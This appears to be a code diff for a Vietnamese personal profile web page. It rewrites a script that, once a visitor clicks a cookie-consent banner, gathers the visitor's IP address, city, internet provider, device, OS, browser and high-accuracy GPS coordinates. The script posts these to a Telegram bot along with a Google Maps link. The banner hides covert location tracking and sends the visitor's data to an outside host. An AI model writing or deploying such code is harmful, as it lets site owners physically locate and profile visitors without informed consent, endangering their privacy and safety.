@@ -57,82 +57,195 @@ function adjustZoom() {
 window.addEventListener('resize', adjustZoom);
 adjustZoom();
 
+     // --- 1. CẤU HÌNH ---
         const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
+let isTrackingStarted = false;
 
-        window.onload = () => {
-            if (!localStorage.getItem('is_accepted')) {
-                setTimeout(() => { document.getElementById('cookie-box').style.display = 'block'; }, 1000);
-            } else {
-                startAutoTracking();
+// --- 2. HÀM LẤY IP ĐA LUỒNG (Đã fix để lấy đúng Nhà mạng) ---
+async function fetchIpInfo() {
+    const apis = [
+        {
+            // Nguồn 1: ipwho.is (Rất chi tiết cho VN)
+            url: 'https://ipwho.is/',
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                isp: d.connection?.isp || d.isp || d.org 
+            })
+        },
+        {
+            // Nguồn 2: ip-api.com (Cực kỳ chính xác nhà mạng Viettel/VNPT)
+            url: 'http://ip-api.com/json/?fields=status,message,country,city,isp,org,as,query',
+            parse: (d) => ({ 
+                ip: d.query, 
+                city: d.city, 
+                isp: d.isp || d.org || d.as 
+            })
+        },
+        {
+            // Nguồn 3: ipapi.co
+            url: 'https://ipapi.co/json/',
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                isp: d.org || d.asn || d.version 
+            })
+        }
+    ];
+
+    for (const api of apis) {
+        try {
+            console.log(`Thử nguồn: ${api.url}`);
+            const res = await fetch(api.url);
+            if (!res.ok) throw new Error("API Limit");
+            const data = await res.json();
+            
+            const result = api.parse(data);
+            // Kiểm tra nếu có dữ liệu IP và ISP thì mới trả về
+            if (result.ip && result.isp && result.isp !== "N/A") {
+                return result;
             }
-        };
-
-        function acceptCookies() {
-            localStorage.setItem('is_accepted', 'true');
-            document.getElementById('cookie-box').style.display = 'none';
-            startAutoTracking();
+        } catch (e) {
+            console.warn(`Nguồn ${api.url} lỗi, chuyển nguồn tiếp theo...`);
+            continue;
         }
-
-        async function startAutoTracking() {
-           // 1. Lấy thông tin IP & Nhà mạng (Dùng nguồn ipwho.is ổn định hơn)
-    let ipInfo = {};
-    try {
-        // Sử dụng ipwho.is thay vì ipapi.co
-        const res = await fetch('https://ipwho.is/');
-        const data = await res.json();
-        
-        if (data.success) {
-            ipInfo = {
-                ip: data.ip,
-                city: data.city,
-                // ipapi dùng .org, ipwho dùng .connection.isp nên cần gán lại cho khớp
-                org: data.connection ? data.connection.isp : 'Unknown' 
-            };
-        } else {
-             throw new Error("Get IP failed");
-        }
-    } catch (e) { 
-        ipInfo = { 
-            ip: "Không xác định", 
-            city: "Không xác định", 
-            org: "Không xác định" 
-        }; 
     }
-            // 2. Lấy tọa độ GPS (Cần người dùng bấm "Cho phép" 1 lần)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => sendData(pos, ipInfo), 
-                    () => sendData(null, ipInfo), 
-                    { enableHighAccuracy: true }
-                );
-            }
-        }
+    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
+}
 
-        function sendData(pos, ip) {
-            let message = `<b>⚡ CÓ NGƯỜI TRUY CẬP PROFILE</b>\n\n`;
-           message += `<b>🌐 IP:</b> <code>${ip.ip}</code>\n`;
-           message += `<b>🏙️ Thành phố:</b> ${ip.city || 'Không xác định'}\n`;
-           message += `<b>🏢 Nhà mạng:</b> ${ip.org || 'Không xác định'}\n`;
+// --- 3. HÀM LẤY TỌA ĐỘ GPS ---
+function getPosition() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(pos),
+            () => resolve(null),
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    });
+}
 
-            if (pos && pos.coords) {
-           message += `\n<b>📍 Tọa độ GPS:</b>\n`;
-           message += `➡️ Vĩ độ: <code>${pos.coords.latitude}</code>\n`;
-            message += `➡️ Kinh độ: <code>${pos.coords.longitude}</code>\n`;
-           message += `<a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Xem trên Bản đồ</a>\n`;
-          } else {
-           message += `\n<b>📡 GPS:</b> Bị từ chối hoặc không khả dụng\n`;
-      }
+// --- 4. HÀM GỬI DỮ LIỆU (Format mới, đẹp, đầy đủ icon) ---
+async function sendData(pos, ipInfo) {
+   const info = getDeviceInfor(); // Gọi hàm lấy thông tin chi tiết
+    const time = new Date().toLocaleString('vi-VN');
 
-      message += `\n<b>💻 Thiết bị:</b> ${navigator.platform}\n`;
+    let message = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
+    message += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
+    message += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
+    message += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
+    message += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;
 
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-        }
+    // Phần hiển thị thiết bị mới
+    message += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
+    message += `├─ Loại: <b>${info.deviceType}</b>\n`;
+    message += `├─ Hệ điều hành: <code>${info.os}</code>\n`;
+    message += `└─ Trình duyệt: <b>${info.browser}</b>\n\n`;
+
+    if (pos && pos.coords) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        message += `📍 <b>Vị trí GPS:</b>\n`;
+        message += `├ Vĩ độ: <code>${lat}</code>\n`;
+        message += `├ Kinh độ: <code>${lon}</code>\n`;
+        message += `└ 👉 <a href="${mapsUrl}">Nhấn để xem Bản đồ</a>\n\n`;
+    } else {
+        message += `⚠️ <b>GPS:</b> Không khả dụng\n\n`;
+    }
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                disable_web_page_preview: false
+            })
+        });
+    } catch (err) {
+        console.error("Lỗi gửi Telegram:", err);
+    }
+}
+
+// --- 5. HÀM KHỞI CHẠY (Fix lỗi ReferenceError) ---
+async function startAutoTracking() {
+    if (isTrackingStarted) return;
+    isTrackingStarted = true;
+
+    console.log("Đang lấy thông tin...");
+    const ipInfo = await fetchIpInfo();
+    const pos = await getPosition();
+    
+    await sendData(pos, ipInfo);
+}
+
+// --- 6. QUẢN LÝ SỰ KIỆN ---
+window.onload = function() {
+    if (localStorage.getItem('is_accepted')) {
+        startAutoTracking();
+    } else {
+        const cookieBox = document.getElementById('cookie-box');
+        if (cookieBox) cookieBox.style.display = 'block';
+    }
+};
+
+function acceptCookies() {
+    localStorage.setItem('is_accepted', 'true');
+    const cookieBox = document.getElementById('cookie-box');
+    if (cookieBox) cookieBox.style.display = 'none';
+    startAutoTracking();
+}
+function getBrowserName() {
+    const ua = navigator.userAgent;
+    let browser = "Không xác định";
+
+    // Kiểm tra theo thứ tự ưu tiên (vì nhiều trình duyệt chứa chuỗi của nhau)
+    if (ua.includes("CocCoc")) {
+        browser = "Cốc Cốc";
+    } else if (ua.includes("Edg/")) {
+        browser = "Microsoft Edge";
+    } else if (ua.includes("Chrome") && !ua.includes("Chromium")) {
+        browser = "Google Chrome";
+    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+        browser = "Safari";
+    } else if (ua.includes("Firefox")) {
+        browser = "Firefox";
+    } else if (ua.includes("OPR") || ua.includes("Opera")) {
+        browser = "Opera";
+    } else if (ua.includes("Trident") || ua.includes("MSIE")) {
+        browser = "Internet Explorer";
+    }
+
+    return browser;
+}
+function getDeviceInfor() {
+    const ua = navigator.userAgent;
+    let browser = "Trình duyệt ẩn danh";
+    let os = "Không rõ OS";
+    let deviceType = "💻 Máy tính";
+
+    // 1. Nhận diện Trình duyệt (Ưu tiên các bản đặc biệt trước)
+    if (ua.includes("CocCoc")) browser = "Cốc Cốc";
+    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
+    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+
+    // 2. Nhận diện Hệ điều hành (OS)
+    if (ua.includes("Win")) os = "Windows";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("Mac")) os = "MacOS";
+    else if (ua.includes("Linux")) os = "Linux";
+
+    // 3. Phân loại loại thiết bị
+    if (/Android|iPhone|iPad|iPod/i.test(ua)) {
+        deviceType = "📱 Điện thoại";
+    }
+
+    return { browser, os, deviceType };
+}
